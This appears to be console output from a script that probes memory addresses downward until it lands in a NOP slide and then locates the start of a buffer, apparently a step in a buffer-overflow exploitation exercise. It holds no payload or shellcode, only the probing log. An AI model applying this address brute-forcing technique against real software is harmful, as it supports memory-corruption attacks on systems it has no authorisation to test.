python3 find_start_of_buffer.py 0x70000
Step size: 0x200
Trying address: 0x00070000
Trying address: 0x0006FE00
Trying address: 0x0006FC00
Trying address: 0x0006FA00
Trying address: 0x0006F800
Trying address: 0x0006F600
Trying address: 0x0006F400
Trying address: 0x0006F200
Trying address: 0x0006F000
Trying address: 0x0006EE00
Trying address: 0x0006EC00
Trying address: 0x0006EA00
Trying address: 0x0006E800
Trying address: 0x0006E600
Trying address: 0x0006E400
Trying address: 0x0006E200
Trying address: 0x0006E000
Trying address: 0x0006DE00
Trying address: 0x0006DC00
Trying address: 0x0006DA00
Trying address: 0x0006D800
Trying address: 0x0006D600
Trying address: 0x0006D400
Trying address: 0x0006D200
Trying address: 0x0006D000
Trying address: 0x0006CE00
Trying address: 0x0006CC00
Trying address: 0x0006CA00
Trying address: 0x0006C800
Trying address: 0x0006C600
Trying address: 0x0006C400
Trying address: 0x0006C200
Trying address: 0x0006C000
Trying address: 0x0006BE00
Trying address: 0x0006BC00
Trying address: 0x0006BA00
Trying address: 0x0006B800
Trying address: 0x0006B600
Trying address: 0x0006B400
Trying address: 0x0006B200
Trying address: 0x0006B000
Trying address: 0x0006AE00
Trying address: 0x0006AC00
Trying address: 0x0006AA00
Trying address: 0x0006A800
Trying address: 0x0006A600
Jumped inside NOP slide at address 0x0006A600
Trying step size 16
Trying address: 0x0006A600
Trying address: 0x0006A5F0
Trying address: 0x0006A5E0
Trying address: 0x0006A5D0
Trying address: 0x0006A5C0
Trying address: 0x0006A5B0
Trying address: 0x0006A5A0
Trying address: 0x0006A590
Trying address: 0x0006A580
Trying address: 0x0006A570
Trying address: 0x0006A560
Trying address: 0x0006A550
Trying address: 0x0006A540
Trying address: 0x0006A530
Trying address: 0x0006A520
Trying address: 0x0006A510
Trying address: 0x0006A500
Trying address: 0x0006A4F0
Trying address: 0x0006A4E0
Trying address: 0x0006A4D0
Trying address: 0x0006A4C0
Trying address: 0x0006A4B0
Trying address: 0x0006A4A0
Trying address: 0x0006A490
Trying address: 0x0006A480
Trying address: 0x0006A470
Trying address: 0x0006A460
Trying address: 0x0006A450
Trying address: 0x0006A440
Trying address: 0x0006A430
Found start of buffer at 0x0006A430
